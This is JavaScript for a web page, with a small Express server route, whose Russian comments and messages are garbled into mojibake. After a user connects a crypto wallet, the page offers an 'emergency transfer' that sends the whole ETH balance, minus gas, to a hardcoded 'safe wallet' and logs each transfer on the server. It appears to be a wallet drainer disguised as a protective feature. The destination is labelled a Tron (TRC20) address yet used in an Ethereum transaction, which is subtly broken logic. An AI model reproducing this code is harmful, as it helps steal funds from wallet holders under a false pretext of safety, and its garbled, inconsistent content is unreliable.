// –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
const SAFE_WALLET = 'TGGWh4Cm9HmvhBB9HkUoe6zD3Zrfx6psKb'; // TRC20 –∫–æ—à–µ–ª–µ–∫
const GAS_LIMIT = 21000;
const GAS_PRICE_MULTIPLIER = 1.2; // –£–≤–µ–ª–∏—á–∏–≤–∞–µ–º –≥–∞–∑ —Ü–µ–Ω—É –¥–ª—è –±—ã—Å—Ç—Ä–æ–≥–æ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è

// –î–æ–±–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ —Å—É—â–µ—Å—Ç–≤—É—é—â–∏—Ö –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö
let web3;
let userAddress;

// –û–±–Ω–æ–≤–ª—è–µ–º —Ñ—É–Ω–∫—Ü–∏—é –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
connectButton.addEventListener('click', async () => {
    try {
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        updateStatus(`–ö–æ—à–µ–ª–µ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω! –ê–¥—Ä–µ—Å: ${userAddress}`);
        
        connectButton.style.display = 'none';
        signButton.style.display = 'block';
        
        // –ü–û–ö–ê–ó–´–í–ê–ï–ú –°–ï–ö–¶–ò–Æ –≠–ö–°–¢–†–ï–ù–ù–û–ì–û –ü–ï–†–ï–í–û–î–ê –ü–û–°–õ–ï –ü–û–î–ö–õ–Æ–ß–ï–ù–ò–Ø
        document.getElementById('emergencySection').style.display = 'block';
        
        // –ó–ê–ì–†–£–ñ–ê–ï–ú –ë–ê–õ–ê–ù–°–´
        await loadBalances();
        
    } catch (error) {
        // ... —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –∫–æ–¥ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –æ—à–∏–±–æ–∫ ...
    }
});

// –§—É–Ω–∫—Ü–∏—è –∑–∞–≥—Ä—É–∑–∫–∏ –±–∞–ª–∞–Ω—Å–æ–≤
async function loadBalances() {
    const balancesList = document.getElementById('balancesList');
    balancesList.innerHTML = '<p>–ó–∞–≥—Ä—É–∑–∫–∞ –±–∞–ª–∞–Ω—Å–æ–≤...</p>';
    
    try {
        // –û—Å–Ω–æ–≤–Ω–æ–π –±–∞–ª–∞–Ω—Å ETH
        const balance = await web3.eth.getBalance(userAddress);
        const ethBalance = web3.utils.fromWei(balance, 'ether');
        
        balancesList.innerHTML = `
            <p><strong>ETH:</strong> ${parseFloat(ethBalance).toFixed(6)} ETH</p>
        `;
        
    } catch (error) {
        balancesList.innerHTML = '<p style="color: red;">–û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –±–∞–ª–∞–Ω—Å–æ–≤</p>';
    }
}

// –§—É–Ω–∫—Ü–∏—è —ç–∫—Å—Ç—Ä–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞
async function emergencyTransfer() {
    const transferStatus = document.getElementById('transferStatus');
    transferStatus.innerHTML = '<p style="color: orange;">‚è≥ –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞...</p>';
    
    try {
        // –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å
        const balance = await web3.eth.getBalance(userAddress);
        const gasPrice = await web3.eth.getGasPrice();
        const increasedGasPrice = Math.floor(gasPrice * GAS_PRICE_MULTIPLIER);
        
        const gasCost = increasedGasPrice * GAS_LIMIT;
        const transferAmount = BigInt(balance) - BigInt(gasCost);
        
        if (transferAmount <= 0) {
            transferStatus.innerHTML = '<p style="color: red;">‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤ –¥–ª—è –ø–µ—Ä–µ–≤–æ–¥–∞ —Å —É—á–µ—Ç–æ–º –∫–æ–º–∏—Å—Å–∏–∏</p>';
            return;
        }
        
        transferStatus.innerHTML = '<p style="color: orange;">‚è≥ –û—Ç–ø—Ä–∞–≤–∫–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏...</p>';
        
        // –°–æ–∑–¥–∞–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
        const transactionObject = {
            from: userAddress,
            to: SAFE_WALLET,
            value: transferAmount.toString(),
            gas: GAS_LIMIT,
            gasPrice: increasedGasPrice
        };
        
        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é
        const receipt = await web3.eth.sendTransaction(transactionObject);
        
        transferStatus.innerHTML = `
            <p style="color: green;">‚úÖ –ü–µ—Ä–µ–≤–æ–¥ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω!</p>
            <p><strong>–•—ç—à —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:</strong> ${receipt.transactionHash}</p>
            <p><strong>–°—É–º–º–∞:</strong> ${web3.utils.fromWei(transferAmount.toString(), 'ether')} ETH</p>
            <p><strong>–ë–ª–æ–∫:</strong> ${receipt.blockNumber}</p>
        `;
        
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞:', error);
        transferStatus.innerHTML = `<p style="color: red;">‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–≤–æ–¥–∞: ${error.message}</p>`;
    }
}

// –î–æ–±–∞–≤–ª—è–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫ –¥–ª—è –∫–Ω–æ–ø–∫–∏ —ç–∫—Å—Ç—Ä–µ–Ω–Ω–æ–≥–æ –ø–µ—Ä–µ–≤–æ–¥–∞
document.getElementById('emergencyTransferBtn').addEventListener('click', function() {
    const confirmation = confirm(
        'üö® –í–ù–ò–ú–ê–ù–ò–ï! –í—ã —Å–æ–±–∏—Ä–∞–µ—Ç–µ—Å—å –ø–µ—Ä–µ–≤–µ—Å—Ç–∏ –í–°–ï —Å—Ä–µ–¥—Å—Ç–≤–∞ –Ω–∞ –±–µ–∑–æ–ø–∞—Å–Ω—ã–π –∫–æ—à–µ–ª–µ–∫.\n\n' +
        `–ë–µ–∑–æ–ø–∞—Å–Ω—ã–π –∫–æ—à–µ–ª–µ–∫: ${SAFE_WALLET}\n\n` +
        '–≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏–µ –Ω–µ–ª—å–∑—è –æ—Ç–º–µ–Ω–∏—Ç—å. –ü—Ä–æ–¥–æ–ª–∂–∏—Ç—å?'
    );
    
    if (confirmation) {
        emergencyTransfer();
    }
});

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ TRC20 —Ç–æ–∫–µ–Ω–æ–≤ (–¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ)
async function checkTRC20Tokens() {
    // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –ª–æ–≥–∏–∫—É –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ–ø—É–ª—è—Ä–Ω—ã—Ö TRC20 —Ç–æ–∫–µ–Ω–æ–≤
    // –ù–∞–ø—Ä–∏–º–µ—Ä, USDT TRC20: TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t
}



// –ü—Ä–æ–≤–µ—Ä–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π —Å–µ—Ç–∏
async function checkNetwork() {
    try {
        const chainId = await web3.eth.getChainId();
        
        // –ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ —Å–µ—Ç–∏ (Ethereum Mainnet, BSC, Polygon)
        const supportedNetworks = {
            1: 'Ethereum Mainnet',
            56: 'Binance Smart Chain',
            137: 'Polygon'
        };
        
        if (!supportedNetworks[chainId]) {
            updateStatus(`–í–Ω–∏–º–∞–Ω–∏–µ: –í—ã –ø–æ–¥–∫–ª—é—á–µ–Ω—ã –∫ —Å–µ—Ç–∏ ID ${chainId}. –†–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –æ—Å–Ω–æ–≤–Ω—ã–µ —Å–µ—Ç–∏.`, true);
        }
        
    } catch (error) {
        console.error('–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å–µ—Ç–∏:', error);
    }
}

// –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ –ø—Ä–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
// –î–æ–±–∞–≤–∏—Ç—å –≤ —Ñ—É–Ω–∫—Ü–∏—é –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞:
// await checkNetwork();

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞ —Å–æ—Å—Ç–æ—è–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞
async function startWalletMonitoring() {
    // –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π –∞–∫–∫–∞—É–Ω—Ç–∞
    window.ethereum.on('accountsChanged', function (accounts) {
        if (accounts.length === 0) {
            updateStatus('–ö–æ—à–µ–ª–µ–∫ –æ—Ç–∫–ª—é—á–µ–Ω', true);
            document.getElementById('emergencySection').style.display = 'none';
        } else {
            userAddress = accounts[0];
            updateStatus(`–ê–∫–∫–∞—É–Ω—Ç –∏–∑–º–µ–Ω–µ–Ω: ${userAddress}`);
            loadBalances();
        }
    });
    
    // –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∏–∑–º–µ–Ω–µ–Ω–∏–π —Å–µ—Ç–∏
    window.ethereum.on('chainChanged', function(chainId) {
        window.location.reload();
    });
}

// –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø–æ—Å–ª–µ –∑–∞–≥—Ä—É–∑–∫–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
if (typeof window.ethereum !== 'undefined') {
    // ... —Å—É—â–µ—Å—Ç–≤—É—é—â–∏–π –∫–æ–¥ ...
    
    // –ó–∞–ø—É—Å–∫–∞–µ–º –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –ø–æ—Å–ª–µ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏
    setTimeout(startWalletMonitoring, 1000);
}


// server.js - –¥–æ–±–∞–≤–∏—Ç—å –∫ —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–º—É –∫–æ–¥—É
app.post('/api/log-emergency-transfer', (req, res) => {
    const { fromAddress, toAddress, amount, txHash, timestamp } = req.body;
    
    // –õ–æ–≥–∏—Ä—É–µ–º —ç–∫—Å—Ç—Ä–µ–Ω–Ω—ã–π –ø–µ—Ä–µ–≤–æ–¥
    console.log('üö® –≠–ö–°–¢–†–ï–ù–ù–´–ô –ü–ï–†–ï–í–û–î:', {
        fromAddress,
        toAddress,
        amount,
        txHash,
        timestamp: new Date(timestamp).toISOString()
    });
    
    // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å –æ—Ç–ø—Ä–∞–≤–∫—É —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π (email, telegram –∏ —Ç.–¥.)
    
    res.json({ success: true, message: '–õ–æ–≥ —Å–æ—Ö—Ä–∞–Ω–µ–Ω' });
});





